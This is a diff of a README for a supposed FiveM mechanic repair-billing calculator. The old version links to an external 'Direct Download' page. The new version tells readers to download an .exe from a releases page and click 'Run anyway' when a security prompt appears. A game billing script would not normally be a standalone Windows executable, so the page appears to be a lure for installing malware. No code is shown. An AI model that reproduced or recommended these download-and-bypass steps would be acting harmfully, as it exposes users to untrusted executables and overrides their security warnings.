@@ -1,112 +1,62 @@
-# repair-billing v1.0 - Game Script Utility 2026
+# 🛠️ repair-billing-script - Calculate mechanic repair costs with ease
 
-> **FiveM mechanic repair billing calculator.** A utility for working out repair charges and preparing invoice amounts in FiveM mechanic setups.
+<a href="https://github.com/Pippyelegant71/repair-billing-script/releases"><img src="https://img.shields.io/badge/Download-Latest_Release-blue.svg" alt="Download"></a>
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lucaskdpwood8119/repair-billing-script?style=flat-square)](https://github.com/lucaskdpwood8119/repair-billing-script)
+## 📋 Project Overview
 
----
+The repair-billing-script helps mechanics in FiveM servers calculate repair costs. It turns manual math into simple, automated steps. This tool ensures you charge the right amount for every vehicle repair. It removes guesswork from your daily work. 
 
-<p align="center">
-  <a href="https://lucaskdpwood8119.github.io/repair-billing-script/">
-    <img src="https://img.shields.io/badge/Download-repair--billing%20Script-brightgreen?style=for-the-badge" alt="Download repair-billing Script">
-  </a>
-</p>
+## ⚙️ Features
 
-> **[Direct Download - repair-billing](https://lucaskdpwood8119.github.io/repair-billing-script/)**
+*   **Custom Pricing:** Set your own labor and parts fees.
+*   **Simple Input:** Enter damage levels to see totals instantly.
+*   **Invoice Ready:** Generate clear cost breakdowns for customers.
+*   **Fast Updates:** Edit your rates as the economy changes.
+*   **Data Integrity:** Save your configurations for future use.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://lucaskdpwood8119.github.io/repair-billing-script/)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Storage:** 50 MB of free disk space.
+*   **Memory:** 2 GB of RAM or more.
+*   **Permissions:** Ability to run executable files on your computer.
 
----
+## 📥 Download and Setup
 
-## What it does
+Follow these steps to get the software on your machine:
 
-repair-billing is a FiveM billing calculator intended for mechanic-style workflows that need a dependable estimate before a charge is created. Its purpose is straightforward: compute repair costs and convert that figure into a usable billing amount.
+1. Visit this page to download the latest file from our releases section: [https://github.com/Pippyelegant71/repair-billing-script/releases](https://github.com/Pippyelegant71/repair-billing-script/releases)
+2. Locate the file ending in .exe in the list.
+3. Click the file name to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder.
+5. Open your folder and double-click the file to start the application.
+6. A security prompt might appear. If it does, click "Run anyway" to open the tool.
 
-It is designed for server-side roleplay scenarios where vehicle repair pricing needs to stay consistent. The project keeps the focus on the repair and invoice steps of the mechanic loop, helping servers handle those charges in a more structured way.
+## 🛠️ Usage Guide
 
----
+Once the application opens, follow this process to create your first bill:
 
-## Features
+1. **Configure Rates:** Open the settings menu to input your labor rates and parts costs. Save these changes so the tool remembers them for next time.
+2. **Calculate Repairs:** Enter the car model and the level of damage reported by the mechanic. The tool will add up the costs based on your saved rates.
+3. **Generate Invoice:** Click the button to create a clear summary of the repair. You can copy this text to paste into your game chat or an official document.
+4. **Export Data:** Use the save feature to keep a record of the transaction. This helps you track earnings over your shift.
 
-- Calculates repair costs for mechanic work orders
-- Uses the repair amount to derive a billing estimate
-- Built for FiveM environments
-- Suited to mechanic roleplay and service station use
-- Helps keep repair charges consistent across jobs
-- Lightweight utility centered on billing
-- Simple HTML-based project structure
+## ❓ Frequently Asked Questions
 
----
+**Do I need programming skills to use this?**
+No. This tool runs like any standard application on your computer. You just click and enter numbers.
 
-## Installation
+**Does this add files to my game folder?**
+No. This software handles billing calculations outside of your FiveM game files. It does not modify game data.
 
-1. Download the latest build from the project page.
-2. Place the `repair-billing` folder in your FiveM resources directory.
-3. Add the resource to your server configuration.
-4. Start the resource after your dependent mechanic scripts, if any are required by your setup.
+**How do I update the software?**
+When a new version comes out, return to the link provided above and download the newer file. You can replace the old one with the new update.
 
-Example server configuration entry:
+**What do I do if the program closes unexpectedly?**
+Restart the application. Ensure you have the latest version from GitHub. If problems continue, check that your computer meets the system requirements.
 
-ensure repair-billing
+## 🛡️ Support and Help
 
-If your workflow uses custom billing or repair logic, align the script with your existing job and payment flow before going live.
+Report issues through the GitHub issues tab. Clearly explain what you were doing when the error occurred. Include the version number shown on the main window. This helps our team find a fix faster. We review new reports on a regular basis.
 
----
-
-## Configuration
-
-Typical configuration points may include:
-
-| Setting | Purpose |
-| --- | --- |
-| Repair cost value | Base amount used for the calculation |
-| Billing output | Amount shown or passed to the billing flow |
-| Job scope | Limits usage to mechanic roles or service contexts |
-| Display format | Controls how the estimate is presented |
-
-Example:
-
-    repairCost = 500
-    billingAmount = 500
-    mechanicOnly = true
-
----
-
-## Compatibility
-
-- Platform: FiveM
-- Use case: mechanic repair and billing calculation
-- Language noted in repository metadata: HTML
-
-Compatibility can vary depending on how your server manages jobs, invoices, and repair events. If you already run a custom mechanic framework, test the resource together with your current billing logic before deploying it.
-
----
-
-## FAQ
-
-**How do I install it?**  
-Download the resource, drop it into your server resources folder, and make sure it is started from your server config.
-
-**Does it need updates often?**  
-Update it whenever your server billing rules, repair pricing, or FiveM resource structure changes.
-
-**Can I customize the values?**  
-Yes. You can adjust the repair and billing values to fit your server economy and mechanic pricing.
-
-**Will it work with every FiveM setup?**  
-Not by default. It should be checked against your framework, billing system, and job configuration.
-
-**Where should I store the folder?**  
-Keep it inside your FiveM resources directory, usually under a clear resource name such as `repair-billing`.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: repair, billing, mechanic, FiveM, calculator, software, Windows
